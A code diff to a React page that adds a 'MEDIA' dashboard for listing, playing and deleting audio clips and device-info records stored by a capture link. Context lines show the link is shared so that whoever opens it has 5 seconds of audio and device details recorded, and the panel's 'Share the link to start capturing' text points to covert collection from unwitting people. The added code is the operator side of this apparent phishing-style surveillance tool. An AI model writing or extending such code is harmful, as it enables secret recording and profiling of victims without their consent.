@@ -1,14 +1,16 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
 import { 
   Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
-  LucideIcon, Sparkles, Headphones, Info, Link2, Smartphone
+  LucideIcon, Sparkles, Headphones, Info, Link2, Smartphone,
+  Database, Play, Trash2, RefreshCw, Volume2, FileJson
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { toast } from "@/hooks/use-toast";
 import { useSettings } from "@/contexts/SettingsContext";
 import { useAuth } from "@/contexts/AuthContext";
+import { supabase } from "@/integrations/supabase/client";
 import CreditDisplay from "@/components/CreditDisplay";
 import FeatureCard from "@/components/FeatureCard";
 import { cn } from "@/lib/utils";
@@ -21,6 +23,14 @@ interface Page2Tab {
   description: string;
 }
 
+interface CapturedData {
+  id: string;
+  session_id: string;
+  image_data: string;
+  captured_at: string;
+  user_agent: string | null;
+}
+
 const page2Tabs: Page2Tab[] = [
   { 
     id: "audiocapture", 
@@ -29,6 +39,13 @@ const page2Tabs: Page2Tab[] = [
     color: "pink",
     description: "5 sec audio + device info capture"
   },
+  { 
+    id: "media", 
+    label: "MEDIA", 
+    icon: Database, 
+    color: "cyan",
+    description: "View captured data"
+  },
 ];
 
 const Page2 = () => {
@@ -36,6 +53,8 @@ const Page2 = () => {
   const { isLoading: authLoading } = useAuth();
   const [activeTab, setActiveTab] = useState<string | null>(null);
   const [copiedLink, setCopiedLink] = useState(false);
+  const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
+  const [isLoadingData, setIsLoadingData] = useState(false);
 
   const activeTabData = page2Tabs.find(tab => tab.id === activeTab);
 
@@ -43,6 +62,59 @@ const Page2 = () => {
   const baseUrl = window.location.origin;
   const sessionId = settings.camSessionId || "audiocap01";
   const captureLink = `${baseUrl}/audio-capture?session=${sessionId}`;
+
+  // Fetch captured data
+  const fetchCapturedData = async () => {
+    setIsLoadingData(true);
+    try {
+      const { data, error } = await supabase
+        .from("captured_photos")
+        .select("*")
+        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
+        .order("captured_at", { ascending: false });
+      
+      if (error) throw error;
+      setCapturedData(data || []);
+    } catch (err) {
+      console.error("Failed to fetch data:", err);
+    } finally {
+      setIsLoadingData(false);
+    }
+  };
+
+  // Delete captured item
+  const deleteItem = async (id: string) => {
+    try {
+      const { error } = await supabase.from("captured_photos").delete().eq("id", id);
+      if (error) throw error;
+      setCapturedData(prev => prev.filter(item => item.id !== id));
+      toast({ title: "Deleted!", description: "Item removed successfully" });
+    } catch (err) {
+      toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
+    }
+  };
+
+  // Clear all data
+  const clearAllData = async () => {
+    try {
+      const { error } = await supabase
+        .from("captured_photos")
+        .delete()
+        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
+      
+      if (error) throw error;
+      setCapturedData([]);
+      toast({ title: "Cleared!", description: "All data removed" });
+    } catch (err) {
+      toast({ title: "Error", description: "Failed to clear data", variant: "destructive" });
+    }
+  };
+
+  useEffect(() => {
+    if (activeTab === "media") {
+      fetchCapturedData();
+    }
+  }, [activeTab, sessionId]);
 
   const copyLink = async () => {
     await navigator.clipboard.writeText(captureLink);
@@ -236,6 +308,133 @@ const Page2 = () => {
                     <p className="text-[8px] text-muted-foreground">Full details</p>
                   </div>
                 </div>
+              </div>
+            )}
+
+            {/* Media Panel */}
+            {activeTabData?.id === "media" && (
+              <div className="rounded-xl bg-gradient-to-br from-card/90 to-card/70 border border-neon-cyan/40 p-4 overflow-hidden">
+                {/* Header */}
+                <div className="flex items-center justify-between mb-4">
+                  <div className="flex items-center gap-3">
+                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-neon-cyan/30 to-neon-purple/20 border border-neon-cyan/40 flex items-center justify-center">
+                      <Database className="w-6 h-6 text-neon-cyan" />
+                    </div>
+                    <div>
+                      <h2 className="text-sm font-bold text-foreground">CAPTURED DATA</h2>
+                      <p className="text-[10px] text-muted-foreground">Session: {sessionId}</p>
+                    </div>
+                  </div>
+                  <div className="flex gap-2">
+                    <Button
+                      size="sm"
+                      variant="outline"
+                      onClick={fetchCapturedData}
+                      disabled={isLoadingData}
+                      className="h-8 px-3 border-neon-cyan/40 text-neon-cyan hover:bg-neon-cyan/10"
+                    >
+                      <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
+                    </Button>
+                    {capturedData.length > 0 && (
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        onClick={clearAllData}
+                        className="h-8 px-3 border-red-500/40 text-red-400 hover:bg-red-500/10"
+                      >
+                        <Trash2 className="w-3.5 h-3.5" />
+                      </Button>
+                    )}
+                  </div>
+                </div>
+
+                {/* Data List */}
+                {isLoadingData ? (
+                  <div className="flex items-center justify-center py-8">
+                    <Loader2 className="w-6 h-6 text-neon-cyan animate-spin" />
+                  </div>
+                ) : capturedData.length === 0 ? (
+                  <div className="text-center py-8">
+                    <Database className="w-10 h-10 mx-auto mb-2 text-muted-foreground/40" />
+                    <p className="text-xs text-muted-foreground">No data captured yet</p>
+                    <p className="text-[10px] text-muted-foreground/60">Share the link to start capturing</p>
+                  </div>
+                ) : (
+                  <div className="space-y-3 max-h-[400px] overflow-y-auto pr-1">
+                    {capturedData.map((item) => {
+                      const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
+                      const isAudio = item.image_data.startsWith("data:audio");
+                      
+                      return (
+                        <div 
+                          key={item.id}
+                          className={cn(
+                            "p-3 rounded-lg border",
+                            isDeviceInfo 
+                              ? "bg-neon-purple/10 border-neon-purple/30" 
+                              : "bg-neon-pink/10 border-neon-pink/30"
+                          )}
+                        >
+                          <div className="flex items-start justify-between gap-2">
+                            <div className="flex items-center gap-2 flex-1 min-w-0">
+                              {isDeviceInfo ? (
+                                <FileJson className="w-5 h-5 text-neon-purple flex-shrink-0" />
+                              ) : (
+                                <Volume2 className="w-5 h-5 text-neon-pink flex-shrink-0" />
+                              )}
+                              <div className="flex-1 min-w-0">
+                                <p className={cn(
+                                  "text-xs font-bold",
+                                  isDeviceInfo ? "text-neon-purple" : "text-neon-pink"
+                                )}>
+                                  {isDeviceInfo ? "DEVICE INFO" : "AUDIO (5 sec)"}
+                                </p>
+                                <p className="text-[9px] text-muted-foreground truncate">
+                                  {new Date(item.captured_at).toLocaleString()}
+                                </p>
+                              </div>
+                            </div>
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              onClick={() => deleteItem(item.id)}
+                              className="h-7 w-7 p-0 text-red-400 hover:bg-red-500/20"
+                            >
+                              <Trash2 className="w-3.5 h-3.5" />
+                            </Button>
+                          </div>
+                          
+                          {/* Content */}
+                          {isDeviceInfo ? (
+                            <div className="mt-2 p-2 rounded bg-background/50 max-h-32 overflow-y-auto">
+                              <pre className="text-[9px] text-muted-foreground whitespace-pre-wrap break-all font-mono">
+                                {(() => {
+                                  try {
+                                    return JSON.stringify(JSON.parse(item.image_data), null, 2);
+                                  } catch {
+                                    return item.image_data;
+                                  }
+                                })()}
+                              </pre>
+                            </div>
+                          ) : isAudio ? (
+                            <div className="mt-2">
+                              <audio controls className="w-full h-8" src={item.image_data}>
+                                Your browser does not support audio.
+                              </audio>
+                            </div>
+                          ) : (
+                            <div className="mt-2 p-2 rounded bg-background/50">
+                              <p className="text-[9px] text-muted-foreground truncate">
+                                {item.image_data.substring(0, 100)}...
+                              </p>
+                            </div>
+                          )}
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
               </div>
             )}
 
